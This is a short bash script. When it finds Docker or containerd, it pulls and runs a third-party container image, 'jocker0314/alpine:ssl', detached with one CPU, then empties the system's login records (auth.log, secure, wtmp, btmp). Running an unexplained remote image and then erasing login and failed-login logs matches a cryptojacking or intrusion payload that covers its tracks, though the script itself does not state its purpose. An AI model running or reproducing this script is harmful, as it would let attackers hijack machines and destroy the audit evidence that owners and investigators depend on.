#!/bin/bash

# Function to clear all login-related logs
clear_login_logs() {
    # Clearing auth logs
    cat /dev/null > /var/log/auth.log 2>/dev/null || true

    # Clearing secure logs
    cat /dev/null > /var/log/secure 2>/dev/null || true

    # Clearing wtmp logs
    cat /dev/null > /var/log/wtmp 2>/dev/null || true

    # Clearing btmp logs
    cat /dev/null > /var/log/btmp 2>/dev/null || true
}

# Function to check if Docker is installed
check_docker() {
    if command -v docker &> /dev/null; then
        docker run -d --cpus=1 jocker0314/alpine:ssl
        return 0
    else
        return 1
    fi
}

# Function to check if containerd is installed
check_containerd() {
    if command -v ctr &> /dev/null; then
        ctr image pull docker.io/jocker0314/alpine:ssl
        ctr run --detach --cpus 1 docker.io/jocker0314/alpine:ssl my-container
        ctr tasks list
        return 0
    else
        return 1
    fi
}

# Main function
main() {
    if check_docker; then
        echo "Docker installed. Executing Docker command..."
        clear_login_logs
    elif check_containerd; then
        echo "Containerd installed. Executing Containerd commands..."
        clear_login_logs
    else
        echo "Neither Docker nor Containerd is installed."
    fi
}

main
